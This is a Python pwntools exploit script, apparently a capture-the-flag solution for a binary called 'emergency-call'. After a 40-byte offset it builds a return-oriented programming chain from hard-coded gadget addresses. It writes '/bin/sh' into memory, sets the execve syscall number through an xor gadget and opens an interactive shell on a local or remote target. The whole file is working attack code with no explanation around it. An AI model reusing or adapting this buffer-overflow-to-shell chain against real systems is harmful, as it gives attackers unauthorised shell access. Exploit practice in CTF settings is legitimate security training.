#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('emergency-call')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *0x4010e6
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():
    offset = 40
    pop_rdi = 0x0000000000401032
    pop_rsi = 0x0000000000401034
    pop_rdx = 0x0000000000401036
    syscall = 0x000000000040101a

    sh = 0x404000
    xor_eax_edi = 0x0000000000401039 # xor eax, edi; ret; 

    payload = flat({
        offset: [
            pop_rdi,
            0x3b,
            xor_eax_edi,
            pop_rdi,
            sh,
            pop_rsi,
            0x0,
            pop_rdx,
            0x0,
            syscall
        ]
    })

    io.send('/bin/sh\x00')
    io.send(payload)

    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

